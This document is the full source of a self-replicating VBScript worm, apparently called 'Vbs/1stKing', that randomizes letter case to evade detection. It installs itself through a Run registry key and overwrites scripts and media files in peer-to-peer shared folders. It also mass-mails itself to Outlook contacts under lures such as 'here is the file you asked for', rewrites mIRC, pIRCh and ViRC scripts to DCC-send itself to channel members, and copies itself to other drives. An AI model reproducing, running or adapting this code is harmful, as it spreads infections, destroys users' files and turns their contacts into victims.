On ErRoR reSume NEXT
SEt FSO = CreATeOBjeCt("scripTiNg.fIlEsysteMObjecT")
sET wsc = CreATeobJeCT("WscRipt.SHeLL")
set WinDiR = fsO.GeTsPeCIaLfolder(0)
set SySDir = FSo.gEtSpecialFoldER(1)
seT G = Fso.geTfILE(wscripT.SCripTFULLNAme)
sET Otf = fsO.OpENTExtFILe(WScRIpT.SCRIptfUllNAMe, 1)
Ra = oTf.REaDaLl
oTF.CLOSE
mAINrEgkeY = uCASE("HKeY_LOCAl_maCHINE\s") & lcAsE("OFTWARe") _
& ucASe("\M") & LcASE("ICRoSoFt") & Ucase("\w") & LcasE("InDOWS") _
& UcaSE("\c") & LCAse("URREnt") & ucaSe("v") & lcaSE("ERSIon")
pGDiR = wSC.RegrEad(MAiNreGkEY & UcAse("\P") & lCASE("ROGraM") _
& UcasE("F") & lcase("iLEs") & Ucase("d") & LcasE("IR"))
MAincOPY = sYSDIR & "\" & uCasE("MSU") & lCasE("pdT32.VBs")
seT g1A = Fso.cREATETEXtFiLE(MaIncOPy, trUE)
g1A.WRItE CasEChangE(ra)
g1A.cLose
wSC.REGwritE MainRegkey & ucAsE("\R") & LcaSE("uN") _
& UCAse("\msu") & lcAsE("pDt32"), uCAsE("W") _
& LCASe("SCripT.EXe ") & SysdIr & "\" & UcASE("MSu") _
& lCASe("pDt32.vBs %1")
for CFILELOOp = 0 To 8
FiLEarRAY = aRRAY(uCASe("Msu") & LcasE("Pdtc32.VBs"), _
UCase("Wu") & LcaSe("nStC32.VbS"), _
UcasE("wS") & LCASE("rVC32.VbS"), _
ucASE("mS") & lCASe("inEt32.vbS"), _
UCase("W") & lcasE("iniNet.Vbs"), _
uCaSe("s") & LcasE("etUPmGr.VbS"), _
ucaSE("i") & lcASe("nStmGr.vbS"), _
uCAse("O") & LCase("CXMgr32.vBS"), _
UcASe("C") & LcAsE("ABfLdR32.vBS"))
fiLesWiTCH = FIlEArRAY(CfilEloOp)
RAndOmIZe
SEt RnDgsf = fso.gEtSPeciALFOLDeR(InT(2 * rnD))
seT G1B = fSO.cREAtetExtfILE(rNDGsF & "\" & fILEsWItch, TRuE)
g1B.wRItE cAsEChAnge(Ra)
G1b.cLoSE
NEXT
foR coMmonshaReD = 0 tO 15
ARRaYfOlDers = ARRAY(PGDIr & "\liMEwirE\sHAreD", _
PGdIR & "\gnUClEuS\DOWNlOAdS", pGDir & "\GNuclEUS\DOwNlOaDS\InComINg", _
PgDiR & "\sHAReazA\doWNLoaDS", "c:\mY docUMEnTS\my mUSiC", _
"c:\mY mUsIC", "c:\mYMuSIc", "C:\kAZAA\MY SharEd fOLdEr", _
"C:\My DOwNLOadS", PGDIR & "\KAzAa\mY shaRED FoLDEr", _
PgdIR & "\KAzaA lItE\MY SHAReD folDEr", pgdIr & "\BEARSHaRE\SHArEd", _
pgDIR & "\EDONkeY2000\iNCOMinG", pGdiR & "\morPhEUS\my SHAred folDer", _
PgDiR & "\GrOKSTer\MY gROkSTER", PGdir & "\IcQ\sHarEd FIlEs")
SHAreDfOlDER = ArrAYFoLdErS(comMONSHaREd)
IF fSo.FOlDEReXISTs(sHaReDfOLDER) theN
for Each FOLderFiLE iN Fso.gETfoLdeR(shaREdFOlDeR).fiLes
FEXT = LCASe(fsO.GetexteNsIONname(FOLdeRfiLE))
iF fext = lcASE("VBS") OR fEXt = LcASE("vbe") THEn
SET G1C = fsO.oPeNteXtFILE(FOlDeRFILe.PatH, 2)
G1C.WRiTE CASeChaNGe(RA)
G1c.cLoSe
END If
foR SharEDext = 0 to 17
eXTArrAy = aRraY("mp3", "mP2", "mpg", "MPEg", _
"MpE", "avi", "Mov", "DiR", "jpG", "jPEG", "jPe", "gIf", _
"Png", "tiF", "TifF", "PIC", "ARt", "URl")
ExTsWiTCH = ExtarRAy(sHAreDExT)
IF FEXt = LCAsE(eXTsWItcH) TheN
sET G1D = fso.CREatEtExTfiLE(foldeRFILe.path & lcase(".vbS"), tRuE)
g1d.WrITE caSEChaNGe(RA)
g1D.clOse
FsO.DEleTefILe (fOLDerfilE.paTH)
ENd If
NExt
nExT
enD IF
next
SoFtwArepAtH = UcAsE("Hkey_CurReNt_usEr\S") _
& lcaSe("oftwarE") & ucasE("\z") & lCase("ed/[R") _
& ucASE("r") & LcasE("lf]") & UcASe("\Vbs/1") _
& LcASe("st") & ucaSe("k") & LCAsE("iNG")
seT oUTloOKApP = cREAtEOBjecT("ouTLook.AppLicAtIon")
IF Not ouTLoOkaPp = "" thEn
RAnDomizE
SeLect CaSE inT((4 * rNd) + 1)
CaSE 1
RndemLTxT = uCase("f") & LCasE("iT To Be ") & ucaSe("k") & LcaSe("Ing?")
rndsuBjtxT = UcAse("A") & lCasE("RE you fiT TO be ") _
& UcaSe("k") & LCASe("iNg? ") & ucAse("R") _
& LCASe("EAd ThIS fIlE to fiNd oUt :)")
eMLfile = ucaSE("s") & lcASe("UrVEY.Vbs")
cASe 2
rNdemlTxt = UCAse("S") & LCaSe("ent fIlE")
RnDSubJtxT = uCaSe("H") & LCAsE("eLLO,") & vBcRlf _
& UCaSE("h") & LCaSE("ErE iS tHe FiLe thAt yoU aSkED fOr YESterdaY.")
emlfIlE = UcaSe("F") & LcAsE("iLe1.VBS")
CAse 3
RnDemltxt = ucAse("w") & LcASe("aNTeD FilE")
RnDSuBjTXT = uCaSE("h") & LcAsE("ELLo rEADeRS,") & VbcRlF _
& UCaSe("T") _
& lCaSe("his IS tHE fiLe ThAT A loT Of peOPLE hAVE bEEn asKing FOr. ") _
& uCAsE("i") & LcasE(" wilL onLy sEnD this fiLE onCE,") _
& Ucase(" sO") & lCaSE(" pleAse dON'T ASk for tHIS File AgaiN.")
eMLFILe = ucaSE("I") & LCASE("mPorTaNt.VBS")
Case 4
rnDemlTxt = UCASE("t") & LcAse("hE saMPLe")
RNDSuBJTxt = ucaSe("h") & lcasE("erE Is THat sAMpLE That yOU aSked FoR. ") _
& UcasE("p") & Lcase("leasE email Me back anD tELl mE what yOu THInk :)")
eMLfILe = ucaSe("s") & LCaSE("AMPlE.Vbs")
ENd SElECt
rAndomiZe
raNDOMIZE
for RANdcoUNT1 = 1 TO Int((RnD * 9 + 1))
RStriNG1 = rstRing1 & cHR(inT(RNd * 26 + 97))
nexT
RaNdomize
IF INt((11 * RNd) + 1) = 6 ThEn
EmLFiLE = rSTrInG1 & LcASe(".vbS")
EnD IF
sET G1E = FsO.CReAteTExTFilE(WiNdIR & "\" & emLfilE, trUE)
G1E.wRite CASeCHangE(RA)
g1e.CLoSE
SeT GNs = ouTlOOkAPp.gEtNAMeSPACe("mAPi")
for SeARchLisT = 1 TO gNs.aDdreSsLiSTS.cOUNT
COUNtlOOp = 1
RanDoMiZe
If CoUNTLooP > iNt((211 * Rnd) + 160) ThEN
eXIT For
EnD IF
sET OUTLoOKemAil = ouTLOOKApP.creATeitEM(0)
foR SEaRCHeMAILs = 1 TO GNs.AdDRessLISTS(SeArcHlIst).aDdrESsentRIEs.couNT
REademLCOntaCt = wsC.rEGrEaD(SoftWaRePATH & UCasE("\E") _
& lcAse("maIl") & ucASe("u") & LcaSe("SERS\") _
& GnS.ADdreSSLISts(sEaRChLiST).AddResseNTrIEs(cOUntlOop))
IF rEADEMlConTACt = "" tHEN
ouTLOOkeMaiL.recIpIEnts.aDd gNS.aDDREssLISts(SeARcHlIST).addreSSENtriES(CoUNTlOop)
WsC.rEgWRITe SoFtWAREpATh & ucaSE("\e") & LCASe("mAIL") _
& ucaSe("U") & Lcase("SErs\") _
& Gns.AdDREsSLIstS(SEarChlIst).ADdREsSeNTrieS(cOuNTLOOp), SEcONd(Now)
eND IF
couNTLoop = cOUntLoOP + 1
next
oUTLOokEMAil.SuBJECt = RndeMltxt
OutLooKemAIl.boDY = RNdSuBjTxT
OUtlOOKemaIL.AttaCHMENts.Add WInDir & "\" & EmlFilE
rANDOmIZe
if INt((11 * rnD) + 1) = 6 tHEN
OutlOoKEmaIL.iMpORTANCe = 2
EnD IF
oUTLoOKeMAil.delETEAFTersuBMIt = truE
oUtLOoKemaIl.sEnD
NEXt
ENd IF
FoR IRcfoLdeRS = 0 To 3
IRcArrAY = ArrAy("C:\MIRC", "C:\mirC32", _
PgDIr & "\MiRc", PGDIr & "\miRc32")
MIRcSwitcH = iRCarray(irCFOlDERs)
If fSo.fOldErexiSTs(MIRCSWitcH) ThEN
SeT G1F = fSO.createTeXTFile(SYSdir & uCase("\A") & LcasE("bOUT.vbE"), TRuE)
g1F.WriTeliNE CaseCHAnGE(RA)
G1f.cLoSe
IF fSo.fiLEexiSTs(MIrcsWITCH & "\SCRIPt.inI") THeN
Fso.delETeFILe (mircSWItcH & "\sCRIpt.inI")
End If
seT irctexT1 = fSo.CreatetExTFILE(MIRcSWItCH & ucase("\s") & LcASe("cripT.INi"), tRUe)
irCtExt1.wRiTELine LCAse("[SCrIPT]")
IRCteXt1.wriTElINe lCaSe("N5= ON 1:") & uCAsE("Join:#:{")
IrctExT1.wRitELine LCaSe("n6= /IF ( $NiCK == $Me ) { HALT }")
iRCTExT1.WRITELiNE lCasE("n7= /MSG $nick ") & UcaSe("t") & LCAsE("Ry rEAdINg The aBOuT fIlE fOr moRe inFOrMaTIOn.")
IrctexT1.wRITELInE lCAsE("n8= /dcc sEnD -C $Nick ") & sySDir & UcaSe("\A") & LcAsE("bOut.vbe")
IRcTeXt1.WRITeLine LCase("n9= }")
IRCTEXt1.CLOSe
enD iF
NEXt
FOR iRCFolDErS2 = 0 TO 3
iRCarray2 = ARRay("C:\pirCh", "c:\pIRcH32", _
pGdIR & "\PIrcH", PGDiR & "\PIRCh32")
pirchswiTcH = IrCaRRaY2(irCfoLdErs2)
iF fsO.FolderexiSts(pirChSWitCh) Then
SET g1g = fso.CREAtetEXTfiLE(SysdIR & ucaSe("\a") & LcASe("bouT.Vbe"), True)
g1g.wrITE caSecHanGE(RA)
G1g.CLOSe
IF fSO.fILEeXisTs(pIrCHSWItCh & "\eveNTs.Ini") then
FsO.DelEtEFiLE (PirChSWitCh & "\EvEnTs.ini")
eND if
SET irctExt2 = fsO.cREaTetextfiLE(PIrChSwitcH & uCASE("\E") & lCAsE("vents.Ini"), TrUE)
IRCtEXT2.wRItElInE UcAsE("[L") & LCasE("evEls]")
iRCTexT2.WrITeLine uCAsE("E") & lCasE("naBLeD=1")
iRCTExt2.wRitEline uCaSE("C") & lCAsE("OuNt=6")
IrCTEXt2.WRitELinE Ucase("l") & lcaSe("evEl1=000-") _
& uCase("U") & lcASe("NkNOwns")
IrctEXt2.WRITeLINE UCaSE("000-u") _
& LcAse("nKnowNs") & ucASE("E") & LCASe("nABlED=1")
ircTEXT2.WRIteLine uCase("L") _
& lcasE("EVEL2=100-") & UCAsE("L") & lcAsE("EVEL 100")
IrctEXt2.WRITElINe UCASE("100-L") _
& lcaSe("EVEL 100") & UCase("e") & lcASE("NAbLED=1")
irCteXt2.wRIteLiNE UcasE("L") _
& LCASe("eVEL3=200-") & ucasE("L") & lCase("EVeL 200")
IRcTEXT2.WRIteLInE uCase("200-l") _
& LcaSe("EvEl 200") & UcAsE("E") & LCASe("NABled=1")
iRCteXT2.WriTElINe UCAse("l") _
& lCAsE("evEL4=300-") & uCASE("l") & LCAsE("EVeL 300")
iRCTEXT2.WRiteLine UCasE("300-L") _
& LCASE("evEL 300") & UcASe("e") & Lcase("NAbLed=1")
IrCTEXt2.wRIteLine ucASE("l") _
& LcASe("EvEl5=400-") & uCASe("L") & lcase("eVel 400")
IrCteXT2.wrITeLiNe UcasE("400-l") _
& lCAse("EVEL 400") & UcAsE("E") & LCaSe("nAbLeD=1")
irctEXt2.WRitElIne ucAsE("l") _
& LcASe("evEl6=500-") & UcAse("L") & LcASE("evEL 500")
iRctEXT2.wrITELINE uCasE("500-l") _
& LcasE("evEL 500") & UCASE("E") & lCasE("NABlED=1")
ircTeXT2.WritelINE ""
irctEXT2.wriTELiNE ucAsE("[000-u") & lCAsE("NknoWns]")
IRcTEXt2.WrITELine ucasE("u") & LCasE("SEr") _
& ucaSe("C") & LCaSE("ouNT=0")
IRCText2.wrITeLinE uCasE("E") & LCAse("VeNt1=") _
& uCaSe("on JOIN:#:/") & LcASe("MSG $NICk ") _
& UCASE("T") & LcasE("rY rEadING THE ABOUT fIle For moRE iNfORMATIoN.")
IrCtEXt2.WRItEliNE ucase("e") _
& LCase("veNt") & UcAsE("c") & lCASE("OUNt=0")
irCTEXT2.WrITELINe ""
iRCteXT2.WriTeLiNe UCaSe("[100-l") & lCasE("EVEl 100]")
IrCtexT2.WriteLIne uCaSe("U") & lCASe("SEr1=*!*@*")
ircTeXt2.wriTeLine ucaSe("U") & lcaSe("SeR") _
& UcasE("C") & LCAse("ouNT=1")
irCtEXT2.wrIteLiNe UcASE("E") & LcasE("vEnt1=") _
& uCASe("oN jOIn:#:/") & lCase("dCc sEnd $nICk ") _
& SYSdir & UcaSE("\A") & Lcase("bOUt.VbE")
irCteXt2.WRitELInE UcASe("e") & lCase("vEnT") _
& ucaSe("c") & lcaSE("OuNt=1")
iRctExt2.WRITelIne ""
irctEXt2.wrITElIne uCASe("[200-l") _
& LCasE("EvEl 200]")
ircteXT2.wrItelInE ucAsE("U") _
& lCaSE("sEr") & UCAse("c") & lcase("OUnt=0")
iRCTEXt2.WritelinE UCASe("E") _
& lCAsE("venT") & uCasE("C") & LcaSe("ount=0")
iRctext2.writElIne ""
IrCTExT2.WRItEliNE UCasE("[300-L") _
& lCase("Evel 300]")
irctexT2.WRIteliNE ucaSe("u") _
& LcAsE("sEr") & UcaSE("c") & LCase("ounT=0")
IrCTexT2.WRitelINe UCasE("e") _
& lcASe("VeNT") & UCAse("C") & LCaSE("OUNt=0")
iRcTexT2.WRItElinE ""
IRctExT2.WriteLINe UCasE("[400-L") _
& LCaSe("eVeL 400]")
iRcTEXt2.WRITeline UcASE("u") _
& lcAse("SeR") & uCase("C") & lcASE("OUnT=0")
ircteXt2.wriTeLINe UcASe("e") _
& LcasE("VEnT") & uCaSe("c") & LCase("oUNT=0")
IrCTexT2.wRiTELINE ""
irCtexT2.wrITElINe UcAse("[500-L") _
& lcaSe("EvEL 500]")
IrcteXt2.wRitElIne UcASE("u") _
& lcaSe("SEr") & UcAse("C") & LcasE("OUNT=0")
irCTEXt2.WRItEliNE uCASe("e") _
& LCasE("VeNt") & UCaSe("c") & LcAse("oUNt=0")
Irctext2.CLOsE
ENd iF
next
if Fso.foldERexisTs("c:\VIRC") _
oR FSo.fOLDeREXiSTS(PgdIr & "\VIrC") theN
seT g1H = fSo.crEATeTEXtfIlE(sYSdIR & uCAse("\a") & Lcase("bOUt.vBe"), tRUE)
g1H.wrITe cAseCHange(rA)
G1H.closE
WSc.regwrITE uCASe("hKEY_userS\.d") & LcASe("efAult\") _
& UCase("s") & LCaSE("OfTwARE\") & lcaSE("m") & LcaSe("E") _
& ucasE("gAL") & LcASE("i") & uCASE("th s") & LcasE("OFTWArE\") _
& uCASE("v") & LCAse("isUAl ") & UCASe("IRC96\e") _
& lcasE("VENts\") & UCASE("e") & LcASe("VENT") & UcASE("17"), _
lCAse("dCc seND $NIcK ") & sysDIr & ucaSE("\A") & LCaSe("bOUt.Vbe")
end IF
FOr EaCh DRiVecOUnt iN fso.drIVeS
if dRIVecoUnt.driVEtYPe = 3 or DrIvECOUnt.DRivETypE = 2 THEN
IF UCAsE(dRIvECOuNT.PatH) <> uCASe("c:") THen
If drIVEcount.ISrEAdy TheN
Set g1m = fSO.CrEAtetextFiLE(DRiVECoUNT.PATH _
& ucAse("\u") & lCasE("niNsTAll.vbS"))
g1M.WRiTE CasEChANgE(RA)
g1m.cLOSE
sET g1N = Fso.CrEaTeTeXTFILe(drivecOUNt.PAtH _
& ucase("\I") & LCasE("NStall.VbS"))
g1n.WrITe cASEChAnGe(Ra)
G1N.closE
END If
END If
EnD iF
neXT
sEt wrITeneW = FsO.cReaTeTEXtFILE(WsCRiPT.SCriPtFUlLnaMe, tRuE)
wRitENeW.WRIte caseCHANge(Ra)
WRItEneW.cLOse
wsc.rEgWrITE SoftwarEpath & "\", ucAsE("Vbs/1") _
& lCasE("st") & uCaSe("k") & LCASe("INg bY ") _
& ucAsE("z") & LCasE("ED/[r") & UcasE("r") & LCase("lf]")
FuNCTIon casECHANge(tEXtSTriNg)
fOr foRlOOP = 1 TO lEN(teXTsTRINg)
SwitChleTTeR = miD(tEXtStrINg, ForLoOp, 1)
RanDOMiZe
RNd16 = INt((16 * RnD) + 1)
IF Rnd16 > 8 THEN
SwItchlETter = uCasE(CHR(ASC(sWITCHLeTter)))
eLSE
sWITCHLeTTEr = lCaSE(chR(AsC(sWItchletteR)))
ENd if
cASecHANgE = CASEcHANge & swiTChleTTer
nExT
enD FUNCtion